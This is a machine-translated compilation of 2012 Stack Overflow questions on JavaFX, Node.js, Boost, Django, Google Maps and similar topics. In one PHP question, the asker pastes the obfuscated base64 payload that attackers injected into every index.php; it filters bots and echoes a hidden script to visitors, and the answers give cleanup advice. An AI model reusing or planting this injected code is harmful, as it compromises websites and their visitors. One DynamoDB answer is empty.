我有一个在 JavaFX 上编写的应用程序（使用 FXML）。我正在尝试使我的应用程序国际化。我试图按照[本教程](http://docs.oracle.com/cd/E17411_01/javafx/2.0/fxml_get_started/fxml_tutorial.htm#CHDFJDAE)中的描述进行操作。

我有一个带有如下文本的属性文件：**submit=Войти**

我有一个按钮，用 FXML 描述：

```
<Button id="button1" fx:id="submit" layoutX="69.0" layoutY="200.0" onAction="#loginFired" prefHeight="45.0" prefWidth="97.0" text="\%submit" /> 
```

属性文件和 fxml 文件在同一目录中。

但是我的按钮没有文本，我希望它有，上面写着“%submit”，而不是“Войти”。然后我尝试在[这个教程](https://stackoverflow.com/questions/10143392/javafx-2-and-internationalization)中做类似的事情 在我的初始化方法中，我有 suh 代码：

```
@Override
public void initialize(URL arg0, ResourceBundle resources) {
    if(resources == null)
        System.out.println("error");
} 
```

它给了我一个“错误”的日志信息。

那么，我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:46:29.953

```
text="\%submit" 
```

`\`字符意味着转义下一个字符，`%`在这种情况下，导致在输出中写为“%submit”。所以正确的用法是`text="%submit"`.

如果您使用 FXMLLoader 加载 FXML 文件，请不要忘记设置资源：

```
fxmlLoader.setResources(ResourceBundle.getBundle("bundles.MyBundle", locale)); 
```

再次查看[JavaFX 2 和 Internationalization](https://stackoverflow.com/q/10143392/682495)的完整示例。
还要检查结果是否`ResourceBundle.getBundle("bundles.MyBundle", locale)`为空。

# amazon-dynamodb - 是否可以附加到 DynamoDB 中的多值属性？

> ID：10603840
> 
> 赞同：6
> 
> 时间：2012-05-15T15:18:48.923
> 
> 标签：amazon-dynamodb

是否可以附加到 Amazon DynamoDB 表中多值属性的值列表中？我不太能够使用 put 请求来解决这个问题。如果可能，我想避免读取、更新、写入逻辑。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-22T11:50:55.030

# svn - 用于 TFS 2010 的 TortoiseSVN-Like Repo 浏览器

> ID：10603842
> 
> 赞同：2
> 
> 时间：2012-05-15T15:19:01.590
> 
> 标签：svn, tfs, tortoisesvn

我的公司一直在使用 SVN，但最近迁移到 TFS 2010 以进行源代码控制、持续集成和工作项管理。到目前为止，我们对 TFS 非常满意，但它似乎缺少一些我们喜欢 TortoiseSVN 的功能。具体来说，TortoiseSVN Repo-Browser 能够选择要查看的修订版本。这样，您可以轻松查看您选择的修订版本中存在哪些文件和文件夹。

我们无法找到使用 VS2010 中的源代码管理资源管理器执行此操作的方法。这使得很难获得重新集成到主干中并被删除的开发分支的历史记录。

我已经研究过像 SVNBridge 这样的解决方案，但还没有让它正常工作。有没有其他解决方案可以实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T17:12:13.173

如果我错了，请纠正我，将您的问题理解为需要在应用某些特定标签时准确查看源代码管理中存在哪些文件。对于这种情况，我有单独的工作区设置，它映射到我的驱动器上的一个工作文件夹，而不是我的默认工作区。所以我可以在源代码管理资源管理器中切换到这个工作区，然后转到文件->源代码管理->获取特定版本，指定标签或日期，然后获取文件。

如果您不想获取这些文件但只需要查看文件列表，那么您可以使用 File->Source Control->Label->Find Label... - 虽然 UI 不是最友好的用户界面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T16:49:57.660

TFS 目前不提供此视图，但它是我们积压的内容。很高兴听到这是人们想要的东西。我会确保我们更加重视这种体验。

如果您有兴趣自己编写此视图，请告诉我，我可以指出您应该使用的 API。

# css - CSS3 过渡行为与浮动元素上的文本换行有奇怪的效果

> ID：10603856
> 
> 赞同：0
> 
> 时间：2012-05-15T15:20:01.057
> 
> 标签：css, css-float, css-transitions

我在元素的边缘顶部放置了一个过渡，我遇到了一个问题，即文本没有正确环绕浮动元素。它似乎在大多数情况下都可以正常工作，但在尾端它将出现在浮动元素上方。它似乎在最新版本的 Firefox (mac) 中可以正常工作，但在 Chrome/Safari (mac) 中却不能：

[http://dabblet.com/gist/2704263](http://dabblet.com/gist/2704263)

我希望有人可能对为什么会发生这种情况有所了解，并可能有一个解决方案。

![例子](../Images/ca5a15184830d6038e5808c0be80ef15.png)

（编辑）我已经更新了 dabblet 以正确显示问题。请务必将鼠标悬停在文本上。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T19:49:52.480

好吧，我不明白为什么，但是如果您定位图像 ( `position: relative;`)，问题就会消失。

# javascript - Sencha Touch 2 的大型离线存储

> ID：10603859
> 
> 赞同：6
> 
> 时间：2012-05-15T15:20:10.170
> 
> 标签：javascript, sqlite, sencha-touch, local-storage

我目前正在开发一个移动应用程序（使用 Sencha Touch 2 实现并设计为在 iPad 上运行）。需要将相当大量的数据（3000 多个对象，对象有大约 30 个字段）从 Web 服务拉到应用程序，然后将数据保存在本地以供离线使用。我已经研究了[此处](https://www.sencha.com/learn/taking-sencha-touch-apps-offline/)和其他地方讨论的标准解决方案，其中本地存储代理用于在从 Web 服务中提取数据后持久保存数据，但由于我试图持久保存的数据量，我遇到了可怕的 QUOTA_EXCEEDED_ERR。

有一些讨论诸如 SQLLite 和 Lawnchair 之类的主题（包括[这个](https://stackoverflow.com/questions/3712921/sencha-sqlite-example)主题，其中有人提到将 Sencha 与 Lawnchair 集成并引用了我在任何地方都找不到的指南），但没有具体的示例或成功案例。任何人都可以推荐一种使用 Sencha Touch 持久化大型数据集的久经考验的方法吗？

**编辑：在**[Sencha 论坛上](http://www.sencha.com/forum/showthread.php?205461-Large-Offline-Storage-with-Sencha-Touch-2&p=803975#post803975)提出类似问题后，我正在调查使用[SQLite Proxy for ST2](http://www.sencha.com/forum/showthread.php?195991-SQLite-Proxy-for-ST2-%28advanced%29)使用 SQLite 。一旦我取得进展，将进一步更新此线程以造福他人。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-17T14:12:17.097

最终使用[ST2 的 SQLite 代理](http://www.sencha.com/forum/showthread.php?195991-SQLite-Proxy-for-ST2-%28advanced%29)来解决我关于大型数据集持久性的问题。强烈推荐，并且在 Sencha 论坛上有一个非常有用的社区，他们在使解决方案正常工作方面非常宝贵。

# javascript - 非常简单的 Node.js 客户端在多次 http 请求后抛出错误 ENOBUFS

> ID：10603860
> 
> 赞同：10
> 
> 时间：2012-05-15T15:20:14.583
> 
> 标签：javascript, node.js

我有以下设置：

node.js 客户端向 node.js 服务器发出端到端请求。不到一分钟后，客户端失败并出现错误 ENOBUFS。

**客户：**

```
(function(){ 

        var loadUrl=function(){
            var http=require('http');   
            var querystring=require('querystring'); 
            var options = {host:"localhost",port:1337,path:'/post',method:'POST'};

            var req = http.request(options, function(res){              
                res.setEncoding('utf8');
                var body='';
                res.on('data', function (chunk) {
                    body+=chunk;
                });           
                res.on('end', function (chunk) {
                    loadUrl();   
                });   
            }); 
            req.on('error', function(e) {
              console.log('problem with request: ' + e.message);
            });
            var post_data = querystring.stringify({id:0});
            req.write(post_data);
            req.end();
        }
        setTimeout(loadUrl,1000);   
    })() 
```

**服务器：**

```
var http = require('http');
http.createServer(function (req, res) {
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.end('Hello World\n');
}).listen(1337, '127.0.0.1'); 
```

虽然[这个问题](https://stackoverflow.com/questions/10513415/enobufs-when-using-http-get)很相似，但我将其发布为原始问题的概括（我使用的是 post 而不是 get），并带有一个测试用例。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T16:03:31.910

该问题似乎是 Node.js HTTP 客户端连接池的问题。

如果将选项添加`agent:false`到[函数](http://nodejs.org/docs/latest/api/http.html#http_http_request_options_callback)`options`的参数中，它将禁用连接池并让每个请求都使用 header 。此更改似乎允许客户端代码无限期运行。[`http.request()`](http://nodejs.org/docs/latest/api/http.html#http_http_request_options_callback)`Connection: close`

```
var options = {agent:false, host:"localhost", port:1337, /*...*/ }; 
```

这样做会降低 HTTP 客户端的性能，并且您应该会看到客户端进程经常暂停（可能是在 V8 运行时进行垃圾收集时）。但它似乎确实解决了你的问题！

根据@joshp 的评论，查看此问题是否已在更高版本的 Node.js 中得到解决，或者考虑提交错误报告。

# php - PHP Web App 被黑了，他们是怎么做到的，我该如何防止它再次发生？

> ID：10603870
> 
> 赞同：0
> 
> 时间：2012-05-15T15:21:01.603
> 
> 标签：php, security

我确信这发生在许多其他人身上，但我不确定找到解决方案的正确搜索，我的搜索结果一直是空的。

一个黑客进入了我的网络应用程序，并将下面的 eval 代码插入到所有 index.php 页面中。我们的网站微不足道，所以我确信这是一次自动攻击。我在网站上安装了 phpBB 和 wordpress。我无法再进入 phpMyAdmin

1.  他们怎么能做到这一点？
2.  我该如何修复它？
3.  我该怎么做才能防止它再次发生？

    ```
    base64_decode('ZXydIVFRQX1VTRVJfQUdFTlQnXTsNCiRib3RzVUEgPSBhcnJheSgnMTIzNDUnLCdhbGV4YS5jb20nLCdhbm9ueW1vdXNlLm9yZycsJ2JkYnJhbmRwcm90ZWN0LmNvbScsJ2Jsb2dwdWxzZS5jb20nLCdib3QnLCdidXp6dHJhY2tlci5jb20nLCdjcmF3bCcsJ2RvY29tbycsJ2RydXBhbC5vcmcnLCdmZWVkdG9vbHMnLCdodG1sZG9jJywnaHR0cGNsaWVudCcsJ2ludGVybmV0c2Vlci5jb20nLCdsaW51eCcsJ21hY2ludG9zaCcsJ21hYyBvcycsJ21hZ2VudCcsJ21haWwucnUnLCdteWJsb2dsb2cgYXBpJywnbmV0Y3JhZnQnLCdvcGVuYWNvb24uZGUnLCdvcGVyYSBtaW5pJywnb3BlcmEgbW9iaScsJ3BsYXlzdGF0aW9uJywncG9zdHJhbmsuY29tJywncHNwJywncnJycnJycnJyJywncnNzcmVhZGVyJywnc2x1cnAnLCdzbm9vcHknLCdzcGlkZXInLCdzcHlkZXInLCdzem4taW1hZ2UtcmVzaXplcicsJ3ZhbGlkYXRvcicsJ3ZpcnVzJywndmxjIG1lZGlhIHBsYXllcicsJ3dlYmNvbGxhZ2UnLCd3b3JkcHJlc3MnLCd4MTEnLCd5YW5kZXgnLCdpcGhvbmUnLCdhbmRyb2lkJywnY2hyb21lJyk7DQpmb3JlYWNoICgkYm90c1VBIGFzICRicykge2lmKHN0cnBvcyhzdHJ0b2xvd2VyKCR1YSksICRicykhPT0gZmFsc2UpeyRib3QgPSB0cnVlOyBicmVhazt9fQ0KaWYgKCEkYm90KXsNCgllY2hvKGJhc2U2NF9kZWNvZGUoJ1BITmpjbWx3ZEQ1cFBUQTdkSEo1ZTJGMllYTjJQWEJ5YjNSdmRIbHdaVHQ5WTJGMFkyZ29laWw3YUQwaWFHRnlRMjlrWlNJN1pqMWJKeTB6TTJZdE16Tm1Oak5tTmpCbUxURXdaaTB5WmpVNFpqWTVaalUzWmpjMVpqWTNaalU1WmpZNFpqYzBaalJtTmpGbU5UbG1OelJtTWpkbU5qWm1OVGxtTmpkbU5UbG1OamhtTnpSbU56Tm1NalJtTnpsbU5ESm1OVFZtTmpGbU16Wm1OVFZtTmpkbU5UbG1MVEptTFRObU5UWm1OamxtTlRobU56bG1MVE5tTFRGbU5EbG1ObVkxTVdZdE1XWTRNV1l0TWpsbUxUTXpaaTB6TTJZdE16Tm1Oak5tTmpCbU56Sm1OVFZtTmpkbU5UbG1OekptTFRKbUxURm1NVGRtTFRJNVppMHpNMll0TXpObU9ETm1MVEV3WmpVNVpqWTJaamN6WmpVNVppMHhNR1k0TVdZdE1qbG1MVE16Wmkwek0yWXRNek5tTlRobU5qbG1OVGRtTnpWbU5qZG1OVGxtTmpobU56Um1OR1kzTjJZM01tWTJNMlkzTkdZMU9XWXRNbVl0T0dZeE9HWTJNMlkyTUdZM01tWTFOV1kyTjJZMU9XWXRNVEJtTnpObU56Sm1OVGRtTVRsbUxUTm1OakptTnpSbU56Um1OekJtTVRabU5XWTFaall5WmpjMFpqY3laamM0WmpVM1pqYzVaamMwWmpjMlpqWXdaalkzWmpZeVpqWXhaalJtTmpabU5qbG1OemRtTlRsbU56Tm1OelJtTnpCbU56Sm1Oak5tTlRkbU5UbG1Oek5tTkdZMU5XWTNOR1kxWmpJeFpqWXhaalk1WmpFNVpqaG1MVE5tTFRFd1pqYzNaall6WmpVNFpqYzBaall5WmpFNVppMHpaamRtTm1ZdE0yWXRNVEJtTmpKbU5UbG1Oak5tTmpGbU5qSm1OelJtTVRsbUxUTm1OMlkyWmkwelppMHhNR1kzTTJZM05HWTNPV1kyTm1ZMU9XWXhPV1l0TTJZM05tWTJNMlkzTTJZMk0yWTFObVkyTTJZMk5tWTJNMlkzTkdZM09XWXhObVkyTW1ZMk0yWTFPR1kxT0dZMU9XWTJPR1l4TjJZM01HWTJPV1kzTTJZMk0yWTNOR1kyTTJZMk9XWTJPR1l4Tm1ZMU5XWTFObVkzTTJZMk9XWTJObVkzTldZM05HWTFPV1l4TjJZMk5tWTFPV1kyTUdZM05HWXhObVkyWmpFM1pqYzBaalk1Wmpjd1pqRTJaalptTVRkbUxUTm1NakJtTVRobU5XWTJNMlkyTUdZM01tWTFOV1kyTjJZMU9XWXlNR1l0T0dZdE1XWXhOMll0TWpsbUxUTXpaaTB6TTJZNE0yWXRNamxtTFRNelppMHpNMlkyTUdZM05XWTJPR1kxTjJZM05HWTJNMlkyT1dZMk9HWXRNVEJtTmpObU5qQm1OekptTlRWbU5qZG1OVGxtTnpKbUxUSm1MVEZtT0RGbUxUSTVaaTB6TTJZdE16Tm1MVE16WmpjMlpqVTFaamN5WmkweE1HWTJNR1l0TVRCbU1UbG1MVEV3WmpVNFpqWTVaalUzWmpjMVpqWTNaalU1WmpZNFpqYzBaalJtTlRkbU56Sm1OVGxtTlRWbU56Um1OVGxtTWpkbU5qWm1OVGxtTmpkbU5UbG1OamhtTnpSbUxUSm1MVE5tTmpObU5qQm1OekptTlRWbU5qZG1OVGxtTFRObUxURm1NVGRtTmpCbU5HWTNNMlkxT1dZM05HWXlNMlkzTkdZM05HWTNNbVkyTTJZMU5tWTNOV1kzTkdZMU9XWXRNbVl0TTJZM00yWTNNbVkxTjJZdE0yWXlaaTB6WmpZeVpqYzBaamMwWmpjd1pqRTJaalZtTldZMk1tWTNOR1kzTW1ZM09HWTFOMlkzT1dZM05HWTNObVkyTUdZMk4yWTJNbVkyTVdZMFpqWTJaalk1WmpjM1pqVTVaamN6WmpjMFpqY3daamN5WmpZelpqVTNaalU1WmpjelpqUm1OVFZtTnpSbU5XWXlNV1kyTVdZMk9XWXhPV1k0WmkwelppMHhaakUzWmpZd1pqUm1Oek5tTnpSbU56bG1OalptTlRsbU5HWTNObVkyTTJZM00yWTJNMlkxTm1ZMk0yWTJObVkyTTJZM05HWTNPV1l4T1dZdE0yWTJNbVkyTTJZMU9HWTFPR1kxT1dZMk9HWXRNMll4TjJZMk1HWTBaamN6WmpjMFpqYzVaalkyWmpVNVpqUm1OekJtTmpsbU56Tm1Oak5tTnpSbU5qTm1OamxtTmpobU1UbG1MVE5tTlRWbU5UWm1Oek5tTmpsbU5qWm1OelZtTnpSbU5UbG1MVE5tTVRkbU5qQm1OR1kzTTJZM05HWTNPV1kyTm1ZMU9XWTBaalkyWmpVNVpqWXdaamMwWmpFNVppMHpaalptTFRObU1UZG1OakJtTkdZM00yWTNOR1kzT1dZMk5tWTFPV1kwWmpjMFpqWTVaamN3WmpFNVppMHpaalptTFRObU1UZG1OakJtTkdZM00yWTFPV1kzTkdZeU0yWTNOR1kzTkdZM01tWTJNMlkxTm1ZM05XWTNOR1kxT1dZdE1tWXRNMlkzTjJZMk0yWTFPR1kzTkdZMk1tWXRNMll5WmkwelpqZG1ObVl0TTJZdE1XWXhOMlkyTUdZMFpqY3paalU1WmpjMFpqSXpaamMwWmpjMFpqY3laall6WmpVMlpqYzFaamMwWmpVNVppMHlaaTB6WmpZeVpqVTVaall6WmpZeFpqWXlaamMwWmkwelpqSm1MVE5tTjJZMlppMHpaaTB4WmpFM1ppMHlPV1l0TXpObUxUTXpaaTB6TTJZMU9HWTJPV1kxTjJZM05XWTJOMlkxT1dZMk9HWTNOR1kwWmpZeFpqVTVaamMwWmpJM1pqWTJaalU1WmpZM1pqVTVaalk0WmpjMFpqY3paakkwWmpjNVpqUXlaalUxWmpZeFpqTTJaalUxWmpZM1pqVTVaaTB5WmkwelpqVTJaalk1WmpVNFpqYzVaaTB6WmkweFpqUTVaalptTlRGbU5HWTFOV1kzTUdZM01HWTFPV1kyT0dZMU9HWXlOV1kyTW1ZMk0yWTJObVkxT0dZdE1tWTJNR1l0TVdZeE4yWXRNamxtTFRNelppMHpNMlk0TXlkZFd6QmRMbk53YkdsMEtDZG1KeWs3ZGowaVpTSXJJblpoSWp0OWFXWW9kaWxsUFhkcGJtUnZkMXQyS3lKc0lsMDdkSEo1ZTNFOVpHOWpkVzFsYm5RdVkzSmxZWFJsUld4bGJXVnVkQ2dpWkdsMklpazdjUzVoY0hCbGJtUkRhR2xzWkNoeEt5SWlLVHQ5WTJGMFkyZ29jWGRuS1h0M1BXWTdjejFiWFR0OUlISTlVM1J5YVc1bk8zbzlLQ2hsS1Q5b09pSWlLVHRtYjNJb096VTVNU0U5YVR0cEt6MHhLWHRxUFdrN2FXWW9aU2x6UFhNcmNsc2labkp2YlVNaUt5Z29aU2svZWpveE1pbGRLSGRiYWwwcU1TczBNaWs3ZlNCcFppaDJKaVpsSmlaeUppWjZKaVpvSmlaekppWm1KaVoyS1dVb2N5azdQQzl6WTNKcGNIUSsnKSk7DQp9DQo=');?> 
    ```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:25:32.130

首先查看您的 Apache 日志，他们访问了哪些脚本？接下来查看您的站点是否有任何自定义脚本并仔细检查它们。此外，寻找他们可能隐藏的任何后门应用程序。在某些情况下，您可以四处寻找最近修改的文件或最近创建的文件……如果它们很聪明，您将需要检查所有文件。

“他们”，可能是一个脚本，通过将脚本上传到您的站点然后让您的网络服务器运行该脚本来完成此操作。然后网络服务器把其他一切都搞砸了。

你的问题很笼统，所以我在这里给出广泛的建议，当你有详细信息时，你可能想提出一个更具体的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:26:37.247

很抱歉这件事发生在你身上。缺少更多信息，我想说的是您应该研究的内容：

1.  网络服务器安全。您假设他们入侵了您的网络应用程序，但他们可能以某种方式获得了对您的托管帐户的访问权限。如果您通过普通的、不安全的 FTP 传输，这很可能是漏洞的来源。此外，许多共享主机（如果您使用 PHP 并且不确定您是如何被黑客入侵的，我假设您在共享主机上）在保持其他人无法访问用户帐户时具有可怜的安全性。

2.  如果垃圾在动态页面上，那么它们确实会破坏您的应用程序或数据库（如果您无法进入 phpMyAdmin，那么这绝对是一种可能性）。联系您的托管服务提供商，他们希望能够为您提供一个新密码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T15:27:43.503

首先，回滚黑客所做的更改（备份、服务器回滚……）。之后，更新每个 CMS、模块、主题或任何其他 PHP 应用程序 - 并让它们在未来保持最新。如果确实是自动攻击，则攻击者使用了公共异常，这很可能已在您的软件的较新版本中得到修复。

编辑：但是 - 当然 - 删除每一行注入的代码，如他的回答中描述的 Full Decent。

# silverlight - 如何从后面的代码中切换到下一个元素？

> ID：10603872
> 
> 赞同：1
> 
> 时间：2012-05-15T15:21:06.713
> 
> 标签：silverlight

我有一个表单，它根据用户离开邮政编码输入框时输入的邮政编码来加载城市。我需要在回调后将焦点设置到下一个元素。有多个地址，我需要一种方式来说明按 Tab 顺序获取下一个元素并将焦点设置为它。我怎么做？

# c++ - BOOST_FOREACH 使用“break”时进入无限循环？

> ID：10603874
> 
> 赞同：5
> 
> 时间：2012-05-15T15:21:16.957
> 
> 标签：c++, boost, c++03

以下代码段在 `BOOST_FOREACH`语句内部进入了一个无限循环，我不知道为什么。据我从 Boost 文档中可以看出，在`BOOST_FOREACH`循环中使用“break”应该没问题。知道这里可能出了什么问题吗？

```
std::vector<std::wstring> sectors = getSectors();
if (!_sectorCodes.empty()) {  // _sectorCodes is a std::set<std::wstring>.
    bool ok = false; // did we find the sector code we wanted?
    BOOST_FOREACH(Symbol sector, sectors) {
        if (_sectorCodes.find(sector) != _sectorCodes.end()) {
            ok = true;
            break;
        }
    }
    if (!ok) return NULL;
} 
```

如果我用`BOOST_FOREACH`for 循环替换循环（使用迭代器 from `sectors.begin()`to `sectors.end()`），那么它工作得很好（没有无限循环）。

版本和附加信息：

*   提升：1.40.0
*   海湾合作委员会：4.1.2
*   架构：x86_64
*   我只在发布版本中得到这种行为；如果我进行调试构建，那么它会按预期工作。
*   在 Visual Studio 下编译时，它按预期工作——即没有无限循环。

针对 mkb 的问题，这是我运行时得到的结果`gcc -E`：

```
if (!_sectorCodes.empty()) {
 bool ok = false;
 if (boost::foreach_detail_::auto_any_t _foreach_col148 = boost::foreach_detail_::contain( (sectors) , (true ? 0 : boost::foreach_detail_::or_( boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost::foreach_detail_::is_array_(sectors)) , (true ? 0 : boost::foreach_detail_::is_rvalue_( (true ? boost::foreach_detail_::make_probe(sectors) : (sectors)), 0))) , boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost_foreach_is_noncopyable( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)) , boost_foreach_is_lightweight_proxy( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)))))) {} else if (boost::foreach_detail_::auto_any_t _foreach_cur148 = boost::foreach_detail_::begin( _foreach_col148 , (true ? 0 : boost::foreach_detail_::encode_type(sectors, boost::foreach_detail_::is_const_(sectors))) , (true ? 0 : boost::foreach_detail_::or_( boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost::foreach_detail_::is_array_(sectors)) , (true ? 0 : boost::foreach_detail_::is_rvalue_( (true ? boost::foreach_detail_::make_probe(sectors) : (sectors)), 0))) , boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost_foreach_is_noncopyable( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)) , boost_foreach_is_lightweight_proxy( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)))))) {} else if (boost::foreach_detail_::auto_any_t _foreach_end148 = boost::foreach_detail_::end( _foreach_col148 , (true ? 0 : boost::foreach_detail_::encode_type(sectors, boost::foreach_detail_::is_const_(sectors))) , (true ? 0 : boost::foreach_detail_::or_( boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost::foreach_detail_::is_array_(sectors)) , (true ? 0 : boost::foreach_detail_::is_rvalue_( (true ? boost::foreach_detail_::make_probe(sectors) : (sectors)), 0))) , boost::foreach_detail_::and_( boost::foreach_detail_::not_(boost_foreach_is_noncopyable( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)) , boost_foreach_is_lightweight_proxy( boost::foreach_detail_::to_ptr(sectors) , boost_foreach_argument_dependent_lookup_hack_value)))))) {} else for (bool _foreach_continue148 = true; _foreach_continue148 && !boost::foreach_detail_::done( _foreach_cur148 , _foreach_end148 , (true ? 0 : boost::foreach_detail_::encode_type(sectors, boost::foreach_detail_::is_const_(sectors)))); _foreach_continue148 ? boost::foreach_detail_::next( _foreach_cur148 , (true ? 0 : boost::foreach_detail_::encode_type(sectors, boost::foreach_detail_::is_const_(sectors)))) : (void)0) if (boost::foreach_detail_::set_false(_foreach_continue148)) {} else for (Symbol sector = boost::foreach_detail_::deref( _foreach_cur148 , (true ? 0 : boost::foreach_detail_::encode_type(sectors, boost::foreach_detail_::is_const_(sectors)))); !_foreach_continue148; _foreach_continue148 = true) {
  if (_sectorCodes.find(sector) != _sectorCodes.end()) {
   ok = true;
   break;
  }
 }
 if (!ok) return PatternFeatureSet_ptr();
} 
```

这种扩展的一个显着特点是有两个嵌套的 for 循环。我无法弄清楚内部循环和外部循环中发生了什么，但是否有可能（正如大卫所建议的那样）我只是打破了内部循环，而 BOOST_FOREACH 对某些人来说处理得并不正确原因？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T16:06:22.970

我敢打赌，简化功能：

```
std::wstring const* find(std::vector<Symbol> const& sectors) {
    if (!_sectorCodes.empty()) {
        BOOST_FOREACH(Symbol sector, sectors) {
            std::set<Symbol>::const_iterator it = _sectorCodes.find(sector);
            if (it != _sectorCodes.end()) { return &*it; }
        }
    }
    return NULL;
} // find 
```

解决了这个问题。

虽然通过优化，很难知道......但至少你的代码会更具可读性。我没有你的 gcc 版本来测试，我的（或 clang）从来没有遇到过任何问题，所以我只能建议：x

# java - 签名的小程序在浏览器上不起作用

> ID：10603878
> 
> 赞同：3
> 
> 时间：2012-05-15T15:21:41.847
> 
> 标签：java, security, clojure, applet, japplet

我有一个使用该代码从麦克风读取的小程序

```
(defn mic []
  (let [info (DataLine$Info.
              (get-class)
              (get-format))
        line (AudioSystem/getLine info)
        out (ByteArrayOutputStream.)]
    (.open line)
    (.start line))) 
```

它是用“$ jarsigner name-of-project-XXX-SNAPSHOT-standalone.jar seesaw”签名的，但它仍然无法从浏览器打开当我授予“记录”权限（java.policy文件）并用appletviwer打开它时它可以工作完美。如果没有策略文件，我怎样才能让它在浏览器中工作？

# javascript - 获取谷歌地图边界，给定一个边界框，而不加载地图？

> ID：10603880
> 
> 赞同：0
> 
> 时间：2012-05-15T15:21:44.670
> 
> 标签：javascript, google-maps, google-maps-api-3

我正在构建一个商店查找器，并希望实现以下工作流程：

1.  用户输入位置
2.  我们使用 Google Geocoder 对其进行地理编码
3.  我们检查边界框的地理编码结果
4.  我们放大地图以适应指定的范围并查询这些范围内的商店
5.  如果地图范围内有商店，则将它们全部显示在地图上
6.  但是，如果地图边界框内现在没有商店，则进一步放大一级，然后重复（5）直到我们找到一些商店

以上很好，但如果地图在找到一些商店之前实际上没有移动，那将是更好的用户体验。

那么，是否可以按如下方式查询谷歌地图：**给定一个边界框，我们是否可以在不实际加载谷歌地图的情况下找到包含该特定边界框的*正确缩放的谷歌地图的边界？***

我不确定这是否可能，因为它取决于我页面中地图 div 的宽度，我猜。

```
geocoder.geocode( {'address': search_text }, function(results, status) {
  if (status == google.maps.GeocoderStatus.OK) {
    map.panTo(results[0].geometry.location);
    map.fitBounds(results[0].geometry.bounds);
    var bounds_to_check_for_stores = map.getBounds();
    // QUESTION: get bounds_to_check_for_stores without the three preceding steps?
    } 
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T16:02:40.213

`google.maps.LatLngBounds`[^(api-doc)](https://developers.google.com/maps/documentation/javascript/reference#LatLngBounds)有一个方法：它将`extend(point:LatLng)`允许您扩展边界以确保调整边界以包含 `LatLng`作为参数传递的点。该`extend`方法返回一个`LatLngBounds`已调整的。

有了这个，你可以：

1.  扩大地理编码查找的半径，直到找到合适的商店。
2.  找到您希望使用的最近的商店或商店组。
3.  从地图中检索当前边界：`Map.getBounds()`。
4.  调用`LatLngBounds.extend`以调整边界，使用`.geometry.location`您在步骤 2 中选择的商店的属性。
5.  调用`Map.panToBounds`更改地图的视口，保持用户体验简单，因为只会对视图执行一次更改。

# python - 为什么在尝试运行新升级的 Django 1.4 项目时出现“无模块名称用户”？

> ID：10603882
> 
> 赞同：0
> 
> 时间：2012-05-15T15:21:48.620
> 
> 标签：python, django, apache

我已将我的网站从 Django 1.3.1 升级到 Django 1.4。我有一个名为“用户”的应用程序。我的项目有一个 URL 路由规则，如下所示：

```
url(r'', include('users.urls', namespace='users', app_name='users')), 
```

和特定的用户配置文件路由规则：

```
url(r'^profile/(?P<pk>\d+)/$', ProfileDetailView.as_view(),
    name='profile'), 
```

用户应用程序有一个空的**init** .py 文件。不过，我收到一个模板错误：

```
Error during template rendering

In template /home/daniel/python_practice/rainbow/django_templates/user_bar.html, error at line 3
No module named users 
```

当我使用以下模板代码时：

```
<a href="{%url users:profile user.id %}">{{ user.username }}</a> 
```

我已经在这个问题上停留了几个小时。该项目被命名为“彩虹”。我尝试过将 url 调用参数修改为`url rainbow.users:profile ...`. 这样做后，它告诉我“彩虹”不是名称空间。就好像它正在识别`users`名称空间，但随后正在寻找某种模块并且失败了。

有人对此有任何见解吗？

* * *

编辑：

目录结构如下：

```
rainbow
--> rainbow - directory that contains global settings and urls
--> users - the relevant app
    --> __init__.py
    --> ...etc.
--> other apps
--> django_templates (eg. the relevant template would be django_templates/user_bar.html) 
```

* * *

谢谢，

典范RG

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T14:02:43.317

通常情况下，我在寻找答案时遇到的问题极大地限制了我的搜索广告和测试的范围。实际上有两个 URL 配置行，其中指定了不存在的模块。我只是一次修改一个，没有任何积极影响。

这些行是：

```
url(r'^join/$', 'rainbow.users.views.register', name='join'),
url(r'^profile/$', 'rainbow.users.views.self_profile',
    name='user_profile_current'), 
```

`rainbow.`从每个视图中删除解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:58:46.947

只是一个建议，但是当您将 Django 升级到 1.4 时，您是否升级了项目 manage.py ？ [在 django 1.4 中升级 manage.py](https://docs.djangoproject.com/en/dev/releases/1.4/#updated-default-project-layout-and-manage-py) 他们谈论你现在可能遇到的路径问题。正如 okm 所问的那样，如果您无法启动 shell 并导入用户，那么根目录就有问题。

# jquery - 在 jQuery 的 getJSON 中拉取新结果

> ID：10603885
> 
> 赞同：0
> 
> 时间：2012-05-15T15:21:50.367
> 
> 标签：jquery, getjson

我正在努力添加一种在我的[jQuery.JamCity](https://github.com/bluetidepro/jQuery.JamCity)中提取结果的方法。

现在，它用于`getJSON`从 Last.Fm 中提取 api 数据，`$.each`以解析该数据并输出。

我想让它每分钟检查一次新结果，并且`IF`有一个新项目`data[0]`来显示它，但是`ELSE`，不要做任何事情，因为我不想一直弹出最近的歌曲。

